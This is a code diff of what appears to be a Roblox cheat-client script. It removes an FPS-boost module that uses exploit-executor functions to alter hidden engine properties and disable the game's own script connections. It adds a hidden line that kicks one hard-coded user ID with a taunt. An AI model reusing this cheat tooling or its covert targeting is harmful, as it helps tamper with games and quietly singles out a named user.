-						local WaitNumber = 5000
-						for i, v in next, (workspace:GetDescendants()) do
-							pcall(filterinstance, v)
-							WaitNumber += 1
-							if i == WaitNumber then
-								task.wait()
-								WaitNumber = 0
-							end
-						end
-						if checkWhitelisted(nil, "Connection") then
-							workspace.DescendantAdded:Connect(filterinstance)
-						end
-						local terrian = workspace:FindFirstChildOfClass("Terrain")
-						if terrain then
-							terrain.WaterWaveSize = 0
-							terrain.WaterWaveSpeed = 0
-							terrain.WaterReflectance = 0
-							terrain.WaterTransparency = 0
-							sethiddenproperty(terrain, "Decoration", false)
-							part_operations += 5
-						end
-						if checkWhitelisted(nil, "Lighting") then
-							sethiddenproperty(lightingService, "Technology", 2)
-							lightingService.GlobalShadows = false
-							lightingService.FogEnd = 9e9
-							part_operations += 3
-						end
-						if FpsBoostBeta.Enabled then
-							workspace:SetMeshPartHeadsAndAccessories(Enum.MeshPartHeadsAndAccessories.Disabled)
-							getSettings().Physics.AllowSleep = true
-							getSettings().Physics.UseCSGv2 = true
-							getSettings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Skip4
-							getSettings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level04
-							getSettings().Rendering.ViewMode = Enum.ViewMode.GeometryComplexity
-							--getSettings().Rendering.MeshCacheSize = 1
-							getSettings().Rendering.ExportMergeByMaterial = true
-							getSettings().Rendering.EagerBulkExecution = false
-							part_operations += 10
-						end
-
-						if FpsBoostBeta.Enabled then
-							if FpsBoostBlocks.Enabled then
-								for i, block in next, (collectionService:GetTagged("block")) do -- this will destroy blocks which are not visible or needed for you
-									task.spawn(purgeBlocks, block)
-									if i % 100 == 0 then
-										task.wait()
-									end
-								end
-							end
-						end
-	
-						if FpsBoostBeta.Enabled then
-							for id, _ in next, (runserverconnections) do
-								for __, connect in next, (getconnections(runService[id])) do
-									if connect.Function then
-										local src = debug.getinfo(connect.Function).source
-										if checkblocked(src) then
-											runserverconnections[id][#runserverconnections[id] + 1] = src
-											connect:Disable()
-											part_operations += 1
-										end
-									end
-								end
-							end
-						end
-					end)
-				else
-					task.spawn(textureschange, false)
-				end
-			end
-		})
-	
-		FpsBoostSelf = FpsBoostPlus.CreateToggle({
-			Name = "Self",
-			HoverText = "Filter your own character (requires Models to be enabled)",
-			Function = blankFunction
-		})
-	
-		FpsBoostModel = FpsBoostPlus.CreateToggle({
-			Name = "Model",
-			HoverText = "Filter models and their descendants",
-			Function = blankFunction
-		})
-	
-		FpsBoostImages = FpsBoostPlus.CreateToggle({
-			Name = "Images",
-			HoverText = "Filter images and decals",
-			Function = blankFunction
-		})
-		
-		FpsBoostBlocks = FpsBoostPlus.CreateToggle({
-			Name = "Blocks",
-			HoverText = "Filter bedwars blocks",
-			Function = blankFunction
-		})
-	
-		FpsBoostAccessories = FpsBoostPlus.CreateToggle({
-			Name = "Accessories",
-			HoverText = "Filter accessories",
-			Function = blankFunction
-		})
-	
-		FpsBoostLighting = FpsBoostPlus.CreateToggle({
-			Name = "Lighting",
-			HoverText = "Filter the lighting environment",
-			Function = blankFunction
-		})
-	
-		FpsBoostConnection = FpsBoostPlus.CreateToggle({
-			Name = "Connection",
-			HoverText = "Filter all descendants added to the workspace",
-			Function = blankFunction
-		})
-	
-		FpsBoostBeta = FpsBoostPlus.CreateToggle({
-			Name = "Beta",
-			HoverText = "Apply unstable settings",
-			Function = blankFunction
-		})
-	end)
-	
-	--[=[runFunction(function()
-		local BlankModule = {Enabled = false}
-
-		BlankModule = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-			Name = "BlankModule",
-			Function = function(callback)
-				if callback then
-				end
-			end
-		})
-	end)]=]
+if lplr.UserId == 4943216782 then 
+	lplr:Kick('mfw, discord > vaperoblox')
 end
